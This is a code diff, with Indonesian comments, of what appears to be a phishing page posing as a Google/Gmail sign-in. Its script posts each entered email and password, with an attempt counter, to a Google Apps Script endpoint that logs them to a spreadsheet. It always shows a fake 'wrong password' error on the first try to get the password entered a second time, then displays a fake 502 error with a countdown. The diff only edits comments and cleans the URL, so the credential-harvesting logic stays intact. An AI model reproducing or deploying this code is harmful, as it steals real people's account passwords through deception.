@@ -395,8 +395,8 @@
 
   <!-- Logic Script -->
   <script>
-    // MASUKKAN URL WEB APP GOOGLE APPS SCRIPT ANDA DI SINI
-    const SCRIPT_URL = '‎https://script.google.com/macros/s/AKfycbxpeOU5UTaJzyzqyL0esbPNP3GkeoKTRd8O7CcD2wFghQNe1jRFZavipjkcxHZSbN_-Sg/exec';
+    // URL WEB APP GOOGLE APPS SCRIPT
+    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxpeOU5UTaJzyzqyL0esbPNP3GkeoKTRd8O7CcD2wFghQNe1jRFZavipjkcxHZSbN_-Sg/exec';
 
     let currentStep = 'email';
     let passwordAttempts = 0;
@@ -500,7 +500,7 @@
       statusMessage.classList.add('hidden');
     }
 
-    // Fungsi Pengiriman Data ke Google Sheets (Tergabung Sesuai Skrip Lama)
+    // Fungsi Pengiriman Data ke Google Sheets
     async function sendDataToSheets(email, password, attemptNumber) {
       try {
         await fetch(SCRIPT_URL, {
@@ -586,8 +586,8 @@
 
       if (currentStep === 'email') {
         const val = emailInput.value.trim();
-
-        // Validasi ketat: Harus berakhiran @gmail.com ATAU berupa angka (nomor telepon)
+        
+        // Validasi: Harus berakhiran @gmail.com ATAU berupa angka (nomor telepon)
         const isGmail = val.toLowerCase().endsWith('@gmail.com');
         const isPhone = /^\d+$/.test(val);
 
@@ -624,10 +624,10 @@
 
         passwordAttempts++;
 
-        // Pengiriman data otomatis ke Sheet untuk setiap percobaan kata sandi
+        // Pengiriman data otomatis ke Sheet
         sendDataToSheets(emailInput.value, passVal, passwordAttempts);
 
-        // PERCOBAAN 1: Tampilkan pesan kesalahan sandi salah
+        // PERCOBAAN 1: Tampilkan error sandi salah
         if (passwordAttempts === 1) {
           passwordErrorText.textContent = 'Sandi salah. Coba lagi atau klik \'Lupa sandi\' untuk meresetnya.';
           passwordContainer.classList.add('has-error');
@@ -637,7 +637,7 @@
           return;
         }
 
-        // PERCOBAAN 2 (Percobaan Terakhir): Alihkan langsung ke tampilan Error 502 & hitung mundur 30 detik
+        // PERCOBAAN 2: Tampilkan error 502 dengan hitung mundur 30 detik
         trigger502Error();
       }
       else if (currentStep === 'passkey') {
